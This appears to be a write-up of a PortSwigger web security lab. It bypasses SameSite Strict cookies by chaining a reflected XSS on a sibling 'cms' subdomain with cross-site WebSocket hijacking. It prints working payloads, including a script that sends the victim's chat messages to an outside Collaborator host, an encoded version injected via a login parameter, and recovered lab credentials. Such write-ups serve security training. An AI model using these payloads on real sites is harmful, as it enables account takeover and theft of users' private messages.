
# SameSite Strict bypass via sibling domain

This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.

To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.

If you haven't done so already, we recommend completing our topic on WebSocket vulnerabilities before attempting this lab.

Hint: Make sure you fully audit all of the available attack surface. Keep an eye out for additional vulnerabilities that may help you to deliver your attack, and bear in mind that two domains can be located within the same site.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions

- https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking



![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/1.png)

---------------------------------------------

From the already completed “Cross-site WebSocket hijacking” lab in the WebSockets section we have the payload:

```
<script>
    var ws = new WebSocket('wss://0a29009b04e2e582804fc1f700b800d5.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://if1w7siga1cezj30b8k08i20erki8bw0.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```


There is a connection:



![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/2.png)


We can read the Javascript code to write comments to the chat in /resources/js/chat.js:



![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/3.png)

And that the characters encoded when sending a message are: 

``` 
' " < > & \r \n \\
```





![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/4.png)
![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/5.png)


```
(function () {
    var chatForm = document.getElementById("chatForm");
    var messageBox = document.getElementById("message-box");
    var webSocket = new WebSocket(chatForm.getAttribute("action"));

    webSocket.onopen = function (evt) {
        writeMessage("system", "System:", "No chat history on record")
        webSocket.send("READY")
    }

    webSocket.onmessage = function (evt) {
        var message = evt.data;

        if (message === "TYPING") {
            writeMessage("typing", "", "[typing...]")
        } else {
            var messageJson = JSON.parse(message);
            if (messageJson && messageJson['user'] !== "CONNECTED") {
                Array.from(document.getElementsByClassName("system")).forEach(function (element) {
                    element.parentNode.removeChild(element);
                });
            }
            Array.from(document.getElementsByClassName("typing")).forEach(function (element) {
                element.parentNode.removeChild(element);
            });

            if (messageJson['user'] && messageJson['content']) {
                writeMessage("message", messageJson['user'] + ":", messageJson['content'])
            }
        }
    };

    webSocket.onclose = function (evt) {
        writeMessage("message", "DISCONNECTED:", "-- Chat has ended --")
    };

    chatForm.addEventListener("submit", function (e) {
        sendMessage(new FormData(this));
        this.reset();
        e.preventDefault();
    });

    function writeMessage(className, user, content) {
        var row = document.createElement("tr");
        row.className = className

        var userCell = document.createElement("th");
        var contentCell = document.createElement("td");
        userCell.innerHTML = user;
        contentCell.innerHTML = content;

        row.appendChild(userCell);
        row.appendChild(contentCell);
        document.getElementById("chat-area").appendChild(row);
    }

    function sendMessage(data) {
        var object = {};
        data.forEach(function (value, key) {
            object[key] = htmlEncode(value);
        });

        webSocket.send(JSON.stringify(object));
    }

    function htmlEncode(str) {
        if (chatForm.getAttribute("encode")) {
            return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
                var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
                return lookup[c];
            });
        }
        return str;
    }
})();
```


When retrieving this file we find a subdomain “cms” in the HTTP header “Access-Control-Allow-Origin” in the response:



![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/6.png)


There is a login function in the subdomain. It reflects the username we send:



![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/7.png)


Using the XSS payload in the username field we get a XSS:

```
<script>alert(1)</script>
```



![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/8.png)


This is a POST request but can be changed to GET:



![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/9.png)


"As this sibling domain is part of the same site, you can use this XSS to launch the CSWSH attack without it being mitigated by SameSite restrictions"

```
<script>
    document.location = "https://cms-0a29009b04e2e582804fc1f700b800d5.web-security-academy.net/login?username=aa&password=aa";
</script>
```


URL-encode the “Cross-site WebSocket hijacking” payload:

```
%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%32%39%30%30%39%62%30%34%65%32%65%35%38%32%38%30%34%66%63%31%66%37%30%30%62%38%30%30%64%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%69%66%31%77%37%73%69%67%61%31%63%65%7a%6a%33%30%62%38%6b%30%38%69%32%30%65%72%6b%69%38%62%77%30%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
```


Use it as the payload in the username field:


```
<script>
    document.location = "https://cms-0a29009b04e2e582804fc1f700b800d5.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%32%39%30%30%39%62%30%34%65%32%65%35%38%32%38%30%34%66%63%31%66%37%30%30%62%38%30%30%64%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%69%66%31%77%37%73%69%67%61%31%63%65%7a%6a%33%30%62%38%6b%30%38%69%32%30%65%72%6b%69%38%62%77%30%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=aa";
</script>
```




![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/10.png)


Login with credentials carlos:565vmsewc7e8c05o7jf4